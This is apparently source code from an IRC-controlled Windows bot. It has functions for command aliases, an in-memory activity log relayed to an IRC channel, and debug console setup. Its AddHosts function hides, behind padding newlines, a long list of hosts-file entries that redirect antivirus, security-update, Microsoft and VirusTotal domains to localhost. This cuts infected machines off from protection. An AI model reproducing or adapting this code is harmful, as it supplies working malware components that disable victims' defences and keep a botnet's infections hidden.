#include "includes.h"
#include "functions.h"
#include "externs.h"

// globals
#ifdef DEBUG_LOGGING
FILE *gfp;
#endif

char log[LOGSIZE][LOGLINE];

int addalias(char *name, char *command)
{
	int i;
	for (i = 0; i < MAXALIASES; i++) {
		if (aliases[i].name[0] == '\0' || strcmp(aliases[i].name, name) == 0) {
			memset(&aliases[i], 0, sizeof(aliases[i]));
			strncpy(aliases[i].name, name, sizeof(aliases[i].name)-1);
			strncpy(aliases[i].command, command, sizeof(aliases[i].command)-1);
			anum++;
			break;
		}
	}
	return i;
}

void aliaslist(SOCKET sock, char *chan, BOOL notice)
{
	char buffer[IRCLINE];

	irc_privmsg(sock, chan, "-[Alias List]-", notice);
	for (int i = 0; i < MAXALIASES; i++) {
		if (aliases[i].name[0] != '\0') {
			_snprintf(buffer, sizeof(buffer),"%d. %s = %s", i, aliases[i].name, aliases[i].command);
			irc_privmsg(sock, chan, buffer, notice,TRUE);
		}
	}

	return;
}

void addlog(char *desc)
{
	SYSTEMTIME st;

	GetLocalTime(&st);

	for (register int i = LOGSIZE; i >= 0; i--) 
		if (log[i][0] != '\0') 
			strncpy(log[i+1], log[i], sizeof(log[i+1])-1);
	_snprintf(log[0], sizeof(log[0]), "[%.2d-%.2d-%4d %.2d:%.2d:%.2d] %s", st.wMonth, st.wDay, st.wYear, st.wHour, st.wMinute, st.wSecond, desc);

	return;
}

void addlogv(char *desc, ...)
{
	char logbuf[LOGLINE];

	va_list argp;
	va_start(argp, desc); 
	_vsnprintf(logbuf, sizeof(logbuf), desc, argp);

	addlog(logbuf);
	
	return;
}

void showlog(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *filter)
{
	int entries = LOGSIZE, tmp = 0;

	if (!silent) irc_privmsg(sock, chan, "-[Logs]-", notice);

	if (filter) {
		if ((tmp = atoi(filter)) != 0)
			entries = tmp;
	}

	for (int i = 0, j = 0; i < LOGSIZE && j < entries; i++, j++) 
		if (log[i][0] != '\0') {
			if (!filter || tmp != 0)
				irc_privmsg(sock, chan, log[i], notice, TRUE);
			else if (lstrstr(log[i], filter))
				irc_privmsg(sock, chan, log[i], notice, TRUE);
		}
	
	return;
}

void clearlog(SOCKET sock, char *chan, BOOL notice, BOOL silent)
{
	for (register int i = 0;i < LOGSIZE; log[i++][0] = '\0');
	if (!silent) irc_privmsg(sock, chan, "[LOGS]: Cleared.", notice);
	addlog("[LOGS]: Cleared.");

	return;
}

BOOL searchlog(char *filter)
{
	for (int i = 0; i < LOGSIZE; i++) 
		if (log[i][0] != '\0') {
			if (lstrstr(log[i], filter))
				return TRUE;
		}
	
	return FALSE;
}

DWORD WINAPI ShowLogThread(LPVOID param) 
{
	char sendbuf[IRCLINE];
	int entries = LOGSIZE, tmp = 0;

	SHOWLOG showlog = *((SHOWLOG *)param);
	SHOWLOG *showlogp = (SHOWLOG *)param;
	showlogp->gotinfo = TRUE;

	if (!showlog.silent) irc_privmsg(showlog.sock,showlog.chan,"[LOG]: Begin",showlog.notice);

	if (showlog.filter[0] != '\0') {
		if ((tmp = atoi(showlog.filter)) != 0)
			entries = tmp;
	}

	for (int i = 0, j = 0; i < LOGSIZE && j < entries; i++, j++) 
		if (log[i][0] != '\0') {
			if (showlog.filter[0] == '\0' || tmp != 0)
				irc_privmsg(showlog.sock, showlog.chan, log[i], showlog.notice, TRUE);
			else if (lstrstr(log[i], showlog.filter))
				irc_privmsg(showlog.sock, showlog.chan, log[i], showlog.notice, TRUE);
		}
	
	sprintf(sendbuf,"[LOG]: List complete.");
	if (!showlog.silent) irc_privmsg(showlog.sock,showlog.chan,sendbuf,showlog.notice);
	addlog(sendbuf);

	clearthread(showlog.threadnum);

	ExitThread(0);
}

#ifdef DEBUG_LOGGING
void opendebuglog(void)
{
	gfp = fopen(logfile, "ab");

	return;
}

void debuglog(char *buffer, BOOL crlf)
{
	if (gfp != NULL) {
		if (crlf)
			fprintf(gfp,"%s\r\n",buffer);
		else
			fprintf(gfp,"%s",buffer);
		fflush(gfp);
	}

	return;
}

void closedebuglog(void)
{
	fclose(gfp);

	return;
}
#endif

#ifndef NO_HOSTCHG
void AddHosts(void)
{
	// Build path to hosts file
	char szSystemDir[MAX_PATH]; GetSystemDirectory(szSystemDir, sizeof(szSystemDir));
	strncat(szSystemDir, "\\drivers\\etc\\hosts", sizeof(szSystemDir));

	// Check if host entries already exist
	FILE *fp=fopen(szSystemDir, "r"); if(fp) {
		while(fgets(szSystemDir, sizeof(szSystemDir), fp) && !feof(fp))
			if(strstr(szSystemDir, "www.symantec.com")) {
				fclose(fp); return; }
		fclose(fp); }

	// Build path to hosts file
	GetSystemDirectory(szSystemDir, sizeof(szSystemDir));
	strncat(szSystemDir, "\\drivers\\etc\\hosts", sizeof(szSystemDir));

	// Add host entries to the file
	fp=fopen(szSystemDir, "a"); if(fp) {
		fprintf(fp, "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
		fprintf(fp, "\n127.0.0.1\twww.symantec.com\n");
		fprintf(fp, "127.0.0.1\tsecurityresponse.symantec.com\n");
		fprintf(fp, "127.0.0.1\tsymantec.com\n");
		fprintf(fp, "127.0.0.1\twww.sophos.com\n");
		fprintf(fp, "127.0.0.1\tsophos.com\n");
		fprintf(fp, "127.0.0.1\twww.mcafee.com\n");
		fprintf(fp, "127.0.0.1\tmcafee.com\n");
		fprintf(fp, "127.0.0.1\tliveupdate.symantecliveupdate.com\n");
		fprintf(fp, "127.0.0.1\twww.viruslist.com\n");
		fprintf(fp, "127.0.0.1\tviruslist.com\n");
		fprintf(fp, "127.0.0.1\tviruslist.com\n");
		fprintf(fp, "127.0.0.1\tf-secure.com\n");
		fprintf(fp, "127.0.0.1\twww.f-secure.com\n");
		fprintf(fp, "127.0.0.1\tkaspersky.com\n");
		fprintf(fp, "127.0.0.1\tkaspersky-labs.com\n");
		fprintf(fp, "127.0.0.1\twww.avp.com\n");
		fprintf(fp, "127.0.0.1\twww.kaspersky.com\n");
		fprintf(fp, "127.0.0.1\tavp.com\n");
		fprintf(fp, "127.0.0.1\twww.networkassociates.com\n");
		fprintf(fp, "127.0.0.1\tnetworkassociates.com\n");
		fprintf(fp, "127.0.0.1\twww.ca.com\n");
		fprintf(fp, "127.0.0.1\tca.com\n");
		fprintf(fp, "127.0.0.1\tmast.mcafee.com\n");
		fprintf(fp, "127.0.0.1\tmy-etrust.com\n");
		fprintf(fp, "127.0.0.1\twww.my-etrust.com\n");
		fprintf(fp, "127.0.0.1\tdownload.mcafee.com\n");
		fprintf(fp, "127.0.0.1\tdispatch.mcafee.com\n");
		fprintf(fp, "127.0.0.1\tsecure.nai.com\n");
		fprintf(fp, "127.0.0.1\tnai.com\n");
		fprintf(fp, "127.0.0.1\twww.nai.com\n");
		fprintf(fp, "127.0.0.1\tupdate.symantec.com\n");
		fprintf(fp, "127.0.0.1\tupdates.symantec.com\n");
		fprintf(fp, "127.0.0.1\tus.mcafee.com\n");
		fprintf(fp, "127.0.0.1\tliveupdate.symantec.com\n");
		fprintf(fp, "127.0.0.1\tcustomer.symantec.com\n");
		fprintf(fp, "127.0.0.1\trads.mcafee.com\n");
		fprintf(fp, "127.0.0.1\ttrendmicro.com\n");
		fprintf(fp, "127.0.0.1\tpandasoftware.com\n");
		fprintf(fp, "127.0.0.1\twww.pandasoftware.com\n");
		fprintf(fp, "127.0.0.1\twww.trendmicro.com\n");
		fprintf(fp, "127.0.0.1\twww.grisoft.com\n");
		fprintf(fp, "127.0.0.1\twww.microsoft.com\n");
		fprintf(fp, "127.0.0.1\tmicrosoft.com\n");
		fprintf(fp, "127.0.0.1\twww.virustotal.com\n");
		fprintf(fp, "127.0.0.1\tvirustotal.com\n");
		fclose(fp); }

	return;
}
#endif

#ifdef DEBUG_CONSOLE
BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
{
	switch(dwCtrlType) {
	case CTRL_C_EVENT:
	case CTRL_BREAK_EVENT:
	case CTRL_CLOSE_EVENT:
		return TRUE;
	}
 
	return FALSE;
}

void OpenConsole(void)
{
	AllocConsole();
 
	int hCrt = _open_osfhandle((long)GetStdHandle(STD_OUTPUT_HANDLE),_O_TEXT);
	FILE *hf = _fdopen(hCrt,"w");
	*stdout = *hf;
	int i = setvbuf(stdout,NULL,_IONBF,0); 

	hCrt = _open_osfhandle((long)GetStdHandle(STD_ERROR_HANDLE),_O_TEXT);
	hf = _fdopen(hCrt,"w");
	*stderr = *hf;
	i = setvbuf(stdout,NULL,_IONBF,0); 
 
	SetConsoleCtrlHandler(HandlerRoutine, true);

	return;
}
#endif